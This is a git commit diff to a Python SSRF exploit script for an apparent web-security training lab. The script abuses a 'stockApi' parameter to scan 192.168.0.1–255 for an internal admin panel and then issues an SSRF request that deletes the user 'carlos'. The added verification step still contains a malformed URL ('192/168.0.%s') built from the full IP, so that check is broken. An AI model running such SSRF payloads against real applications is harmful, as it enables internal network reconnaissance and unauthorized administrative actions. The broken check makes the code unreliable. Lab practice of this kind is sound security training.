49fa361f1525afc189d28d3b2e976cd24ddbabb2
Jozenartes <jozenarts12@gmail.com>
2025-05-26 15:03:51 +0100

    Fixing semantic errors

--- 04-SSRF/lab-02/ssrf-lab-02.py
+++ 04-SSRF/lab-02/ssrf-lab-02.py
@@ -3,13 +3,13 @@ import sys
 import urllib3 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'https': 'http//127.0.0.1:8080', 'http': 'http//127.0.0.1:8080'}
+proxies = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}
 
 def check_admin_hostname(url):
     check_stock_path = "/product/stock"
-    admin_hostname = ''
+    admin_hostname = '' 
     for i in range(1,256):
-        hostname = 'http://192/168.0.%s:8080/admin' %i
+        hostname = 'http://192.168.0.%s:8080/admin' %i
         params = {'stockApi': hostname}
         r = requests.post(url + check_stock_path, data = params, verify=False, proxies=proxies)
         if r.status_code == 200:
@@ -22,16 +22,22 @@ def check_admin_hostname(url):
 
 def delete_user(url, admin_ip_address):
     delete_user_url_ssrf_payload = 'http://%s:8080/admin/delete?username=carlos' % admin_ip_address
-    check_stock_path = 'product/stock'
+    check_stock_path = '/product/stock'
     param = {'stockApi': delete_user_url_ssrf_payload}
-    r = requests.post(url, check_stock_path, data=param, verify=False, proxies=proxies)
+    r = requests.post(url + check_stock_path, data=param, verify=False, proxies=proxies)
 
     # Check if user was deleleted
-    
+    check_admin_url_ssrf_payload = 'http://192/168.0.%s:8080/admin' % admin_ip_address
+    param2 = {'stockApi' : check_admin_url_ssrf_payload}
+    r = requests.post(url + check_stock_path, data=param2, verify=False, proxies=proxies)
+    if 'User deleted successfuly' in r.text:
+        print("(+) Successfuly delelted Carlos user")
+    else:
+        print("(-) Exploit was uncuccesseful")
 
 
 def main():
-    if len(sys.argv) != 2:
+    if len(sys.argv) !=2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
 
